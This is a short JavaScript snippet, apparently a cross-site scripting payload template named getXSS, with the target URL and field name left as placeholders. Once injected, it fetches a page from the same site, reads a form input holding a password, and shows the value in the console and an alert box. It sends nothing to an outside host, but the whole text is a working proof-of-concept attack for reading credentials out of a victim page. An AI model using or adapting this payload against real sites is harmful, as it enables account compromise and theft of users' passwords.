function getXSS() {
​    var xhr = new XMLHttpRequest();
​    xhr.responseType = "document";
​    xhr.open("GET", GET_URL, true);
​    xhr.onload = function (e) {
​        if (xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
​            page = xhr.response
​            input = page.getElementsByName("REPLACE")[0];
​            console.log("The password is: " + input.value);
​             alert("Your password is: " + input.value);
​        }
​    };
​    xhr.send(null);
}
var GET_URL=[REPLACE]
getXSS();
